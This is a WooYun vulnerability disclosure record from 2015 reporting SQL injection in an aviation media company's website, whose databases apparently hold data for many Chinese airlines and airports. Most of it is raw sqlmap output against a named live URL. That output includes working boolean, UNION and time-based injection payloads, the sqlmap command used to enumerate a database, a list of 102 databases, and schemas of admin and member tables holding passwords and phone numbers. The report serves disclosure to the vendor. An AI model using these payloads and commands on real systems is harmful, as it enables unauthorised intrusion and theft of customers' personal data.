{"id": 45895, "wybug_id": "wooyun-2015-093629", "wybug_title": "某航空传媒公司主站注入漏洞涉及大量航空公司数据（几乎涵盖国内所有航空公司&amp;机场）", "wybug_corp": "航空媒体广告", "wybug_author": "Mr.Q", "wybug_date": "2015-01-24 12:34", "wybug_open_date": "2015-03-10 12:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向公众公开  简要描述： 某航空传媒公司主站注入 涉及大量航空公司数据，包括南航 东航 山航 深航 海南航空公司 四川航空公司...&首都机场 虹桥机场...（几乎涵盖国内所有航空公司&机场） 详细说明：  这是个航空传媒公司，与国内各大航空公司&机场都有业务往来，故数据包括各大航空公司客户的大量数据与业务数据...涉及大量数据啊 求打雷\n\nmask 区域\n1.://**.**.**//www.inflight-media.cn/news.phpid=493\n\n\n[*] starting at 13:56:18[13:56:18] [INFO] resuming back-end DBMS 'mysql' [13:56:18] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=493 AND 7942=7942    Type: UNION query    Title: MySQL UNION query (NULL) - 15 columns    Payload: id=-2045 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71677a6f71,0x51784a56465676454665,0x71786e6571),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=493 AND SLEEP(5)---[13:56:19] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: PHP 5.3.3, Apache 2.2.17back-end DBMS: MySQL 5.0.11\n下面是库，为了清晰，在旁边做了注释\navailable databases [102]:[*] `#mysql50#data09-12`[*] `510cms`[*] `caac-magazine`[*] `eastern-channel`[*] `gateway-csair`[*] `kunming-airlines`[*] `newair-shandong]`[*] `nihao-csair`[*] `shenzhen-airline`[*] airtravelcaac[*] baita   //呼和浩特白塔机场[*] baiyun   //广州白云机场[*] baoan   //深圳宝安机场[*] binhai   //天津滨海机场[*] bus[*] capital[*] changle   //福州长乐机场[*] changzhi   //山西长治机场[*] changzhiairport[*] chengda   [*] chinacharm[*] chongqingairport[*] chuanhang   【【四川航空公司】】[*] datongairport   //大同机场[*] dedecmsv57gbksp1[*] ditie[*] diwobao[*] djp[*] dongfangyangshenginfo[*] donghang   【【东方航空公司】】[*] espcms[*] gaoqi   //厦门高崎机场[*] gat[*] golftimes[*] guohang   【【中国国航】】[*] haihang   【【海南航空公司】】[*] hangjizazhi[*] hehua   //张家界荷花机场[*] hongqiao   //上海虹桥机场[*] huahang   【【中华航空公司】】[*] huanghua   //长沙黄花机场[*] huangjin   //赣州黄金机场[*] information_schema[*] jiayuguanairport   //嘉峪关机场[*] lanzhouairport   //兰州机场[*] lasaairport   //拉萨机场[*] lift[*] lijiangairport   //丽江机场[*] linzhiairport   //林芝机场[*] lishe   //宁波栎社国际机场[*] liuting   //青岛流亭机场[*] longdongbao   //贵阳龙洞堡国际机场[*] longjia   //长春龙嘉机场[*] lukou   //南京禄口国际机场[*] luogang   //合肥骆岗机场[*] lushan   //九江庐山机场[*] meilan   //海口美兰国际机场[*] mysql[*] nanchangairport   //南昌机场[*] nanhang   【【南方航空公司】】   [*] net[*] network[*] performance_schema[*] sanyaairport  //三亚机场[*] scalmagazine[*] shanghang   【【上海航空公司】】   [*] shanhang   【【山东航空公司】】[*] shenhang   【【深圳航空公司】】[*] shoudu   //首都机场[*] shuangliu   //成都双流机场[*] silkroad[*] skygolfer[*] szazhi[*] taipingguoji   //哈尔滨太平国际机场[*] taoxian   //沈阳桃仙机场[*] test[*] tianhe   //武汉天河机场[*] wingsofmacau[*] winsofchina[*] wujiaba   //昆明巫家坝国际机场[*] wusu   //太原武宿国际机场[*] xiahang   【【厦门航空公司】】[*] xianyang   //咸阳机场[*] xiaoshan   //萧山机场[*] xingyulianmeng[*] xingzhimeng[*] xiningairport   //西宁机场[*] xishuangbannaairport   //西双版纳机场[*] xmairlines[*] yanjiairport   //延吉机场[*] yaoqiang   //济南遥墙国际机场[*] yichangairport   //宜昌三峡机场[*] yinchuanairport   //银川机场[*] yiwuairport   //义乌机场[*] yongqiang   //温州机场[*] yuncheng   //运城关公机场[*] yushuairport  //玉树机场[*] zazhi[*] zhejianghangkong[*] zhengzhouairport   //郑州机场[*] zhonglianhang   【【中国联合航空公司】】[*] zhoushuizi   //大连周水子机场\n以南航为例继续：\nsqlmap -u http://www.inflight-media.cn/news.php?id=493 -D nanhang --tables    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 15:58:33[15:58:33] [INFO] resuming back-end DBMS 'mysql' [15:58:35] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=493 AND 7942=7942    Type: UNION query    Title: MySQL UNION query (NULL) - 15 columns    Payload: id=-2045 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71677a6f71,0x51784a56465676454665,0x71786e6571),NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=493 AND SLEEP(5)---[15:58:36] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: PHP 5.3.3, Apache 2.2.17back-end DBMS: MySQL 5.0.11\n\nDatabase: nanhang[83 tables]+-----------------------+| dede_addonarticle     || dede_addonimages      || dede_addoninfos       || dede_addonshop        || dede_addonsoft        || dede_addonspec        || dede_admin            || dede_admintype        || dede_advancedsearch   || dede_arcatt           || dede_arccache         || dede_archives         || dede_arcmulti         || dede_arcrank          || dede_arctiny          || dede_arctype          || dede_area             || dede_channeltype      || dede_co_htmls         || dede_co_mediaurls     || dede_co_note          || dede_co_onepage       || dede_co_urls          || dede_diyforms         || dede_dl_log           || dede_downloads        || dede_feedback         || dede_flink            || dede_flinktype        || dede_freelist         || dede_guestbook        || dede_homepageset      || dede_keywords         || dede_log              || dede_member           || dede_member_company   || dede_member_feed      || dede_member_flink     || dede_member_friends   || dede_member_group     || dede_member_guestbook || dede_member_model     || dede_member_msg       || dede_member_operation || dede_member_person    || dede_member_pms       || dede_member_snsmsg    || dede_member_space     || dede_member_stow      || dede_member_stowtype  || dede_member_tj        || dede_member_type      || dede_member_vhistory  || dede_moneycard_record || dede_moneycard_type   || dede_mtypes           || dede_multiserv_config || dede_mytag            || dede_payment          || dede_plus             || dede_purview          || dede_pwd_tmp          || dede_ratings          || dede_scores           || dede_search_cache     || dede_search_keywords  || dede_sgpage           || dede_shops_delivery   || dede_shops_orders     || dede_shops_products   || dede_shops_userinfo   || dede_softconfig       || dede_sphinx           || dede_stepselect       || dede_sys_enum         || dede_sys_module       || dede_sys_set          || dede_sys_task         || dede_sysconfig        || dede_tagindex         || dede_taglist          || dede_uploads          || dede_verifies         |+-----------------------+\n继续\nDatabase: nanhangTable: dede_admin[6 columns]+--------+-------------+| Column | Type        |+--------+-------------+| email  | numeric     || id     | numeric     || pwd    | non-numeric || typeid | numeric     || uname  | non-numeric || userid | non-numeric |+--------+-------------+\n\nDatabase: nanhangTable: dede_member_person[7 columns]+---------+-------------+| Column  | Type        |+---------+-------------+| address | numeric     || height  | numeric     || mid     | numeric     || mobile  | numeric     || msn     | numeric     || qq      | numeric     || uname   | non-numeric |+---------+-------------+\n\nDatabase: nanhangTable: dede_member[6 columns]+--------+-------------+| Column | Type        |+--------+-------------+| email  | non-numeric || mid    | numeric     || pwd    | non-numeric || rank   | numeric     || uname  | non-numeric || userid | non-numeric |+--------+-------------+\n\n[19:03:18] [INFO] retrieved: 87[19:03:28] [INFO] retrieved: dede_addonarticle[19:05:22] [INFO] retrieved: dede_addonimages[19:06:17] [INFO] retrieved: dede_addoninfos[19:06:58] [INFO] retrieved: dede_addonshop[19:07:39] [INFO] retrieved: dede_addonsoft[19:08:15] [INFO] retrieved: dede_addonspec[19:08:51] [INFO] retrieved: dede_admin[19:09:24] [INFO] retrieved: dede_admintype[19:10:04] [INFO] retrieved: dede_advancedsearch[19:11:33] [INFO] retrieved: dede_arcatt[19:12:17] [INFO] retrieved: dede_arccache[19:13:03] [INFO] retrieved: dede_archives[19:13:50] [INFO] retrieved: dede_arcmulti[19:14:36] [INFO] retrieved: dede_arcrank[19:15:15] [INFO] retrieved: dede_arctiny[19:15:55] [INFO] retrieved: dede_arctype[19:16:29] [INFO] retrieved: dede_area[19:16:56] [INFO] retrieved: dede_channeltype[19:18:17] [INFO] retrieved: dede_co_htmls[19:19:16] [INFO] retrieved: dede_co_mediaurls[19:20:29] [INFO] retrieved: dede_co_note[19:21:09] [INFO] retrieved: dede_co_onepage[19:22:09] [INFO] retrieved: dede_co_urls[19:22:50] [INFO] retrieved: dede_diyforms[19:23:53] [INFO] retrieved: dede_dl_log[19:24:39] [INFO] retrieved: dede_downloads[19:25:43] [INFO] retrieved: dede_erradd[19:26:33] [INFO] retrieved: dede_feedback[19:27:35] [INFO] retrieved: dede_flink[19:28:13] [INFO] retrieved: dede_flinktype[19:28:54] [INFO] retrieved: dede_freelist[19:29:51] [INFO] retrieved: dede_homepageset[19:31:13] [INFO] retrieved: dede_keywords[19:32:16] [INFO] retrieved: dede_log[19:32:47] [INFO] retrieved: dede_member[19:33:37] [INFO] retrieved: dede_member_company[19:34:44] [INFO] retrieved: dede_member_feed[19:35:30] [INFO] retrieved: dede_member_flink[19:36:15] [INFO] retrieved: dede_member_friends[19:37:12] [INFO] retrieved: dede_member_group[19:38:01] [INFO] retrieved: dede_member_guestbook[19:39:15] [INFO] retrieved: dede_member_model[19:40:06] [INFO] retrieved: dede_member_msg[19:40:38] [INFO] retrieved: dede_member_operation[19:41:54] [INFO] retrieved: dede_member_person[19:42:52] [INFO] retrieved: dede_member_pms[19:43:28] [INFO] retrieved: dede_member_snsmsg[19:44:26] [INFO] retrieved: dede_member_space[19:45:11] [INFO] retrieved: dede_member_stow[19:45:50] [INFO] retrieved: dede_member_stowtype[19:46:38] [INFO] retrieved: dede_member_tj[19:47:11] [INFO] retrieved: dede_member_type[19:47:54] [INFO] retrieved: dede_member_vhistory[19:49:16] [INFO] retrieved: dede_moneycard_record[19:51:26] [INFO] retrieved: dede_moneycard_type[19:52:20] [INFO] retrieved: dede_mtypes[19:53:11] [INFO] retrieved: dede_multiserv_config[19:55:14] [INFO] retrieved: dede_myad[19:55:46] [INFO] retrieved: dede_myadtype[19:56:27] [INFO] retrieved: dede_mytag[19:57:00] [INFO] retrieved: dede_payment[19:57:58] [INFO] retrieved: dede_plus[19:58:31] [INFO] retrieved: dede_purview[19:59:23] [INFO] retrieved: dede_pwd_tmp[20:00:16] [INFO] retrieved: dede_ratings[20:01:13] [INFO] retrieved: dede_scores[20:02:04] [INFO] retrieved: dede_search_cache[20:03:29] [INFO] retrieved: dede_search_keywords[20:04:42] [INFO] retrieved: dede_sgpage[20:05:28] [INFO] retrieved: dede_shops_delivery[20:07:10] [INFO] retrieved: dede_shops_orders[20:08:08] [INFO] retrieved: dede_shops_products[20:09:18] [INFO] retrieved: dede_shops_userinfo[20:10:28] [INFO] retrieved: dede_softconfig[20:11:41] [INFO] retrieved: dede_sphinx[20:12:27] [INFO] retrieved: dede_stepselect[20:13:41] [INFO] retrieved: dede_sys_enum[20:14:42] [INFO] retrieved: dede_sys_module[20:15:38] [INFO] retrieved: dede_sys_set[20:16:13] [INFO] retrieved: dede_sys_task[20:16:54] [INFO] retrieved: dede_sysconfig[20:17:49] [INFO] retrieved: dede_tagindex[20:18:54] [INFO] retrieved: dede_taglist[20:19:36] [INFO] retrieved: dede_uploads[20:20:35] [INFO] retrieved: dede_verifies[20:21:47] [INFO] retrieved: dede_vote[20:22:21] [INFO] retrieved: dede_vote_memberDatabase: airtravelcaac[87 tables]+-----------------------+| dede_addonarticle     || dede_addonimages      || dede_addoninfos       || dede_addonshop        || dede_addonsoft        || dede_addonspec        || dede_admin            || dede_admintype        || dede_advancedsearch   || dede_arcatt           || dede_arccache         || dede_archives         || dede_arcmulti         || dede_arcrank          || dede_arctiny          || dede_arctype          || dede_area             || dede_channeltype      || dede_co_htmls         || dede_co_mediaurls     || dede_co_note          || dede_co_onepage       || dede_co_urls          || dede_diyforms         || dede_dl_log           || dede_downloads        || dede_erradd           || dede_feedback         || dede_flink            || dede_flinktype        || dede_freelist         || dede_homepageset      || dede_keywords         || dede_log              || dede_member           || dede_member_company   || dede_member_feed      || dede_member_flink     || dede_member_friends   || dede_member_group     || dede_member_guestbook || dede_member_model     || dede_member_msg       || dede_member_operation || dede_member_person    || dede_member_pms       || dede_member_snsmsg    || dede_member_space     || dede_member_stow      || dede_member_stowtype  || dede_member_tj        || dede_member_type      || dede_member_vhistory  || dede_moneycard_record || dede_moneycard_type   || dede_mtypes           || dede_multiserv_config || dede_myad             || dede_myadtype         || dede_mytag            || dede_payment          || dede_plus             || dede_purview          || dede_pwd_tmp          || dede_ratings          || dede_scores           || dede_search_cache     || dede_search_keywords  || dede_sgpage           || dede_shops_delivery   || dede_shops_orders     || dede_shops_products   || dede_shops_userinfo   || dede_softconfig       || dede_sphinx           || dede_stepselect       || dede_sys_enum         || dede_sys_module       || dede_sys_set          || dede_sys_task         || dede_sysconfig        || dede_tagindex         || dede_taglist          || dede_uploads          || dede_verifies         || dede_vote             || dede_vote_member      |+-----------------------+\n还有好多好多，涉及太多太多内容，客户数据、钱款明细、业务往来公司的数据...不进一步继续了  求打雷啊   漏洞证明：  已证明   修复方案：  你们更懂   版权声明：转载请注明来源 Mr.Q@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-29 08:23 厂商回复： 暂未建立与网站管理单位的直接处置渠道,待认领. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-24 12:35 |    \t\tca1n \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:22        | not yet)\t\t \n  0.0    \n     2015-01-24 13:02 |    \t\tPr1nce \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | 坚持你相信的，相信你坚持的)\t\t \n  洞主要火    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}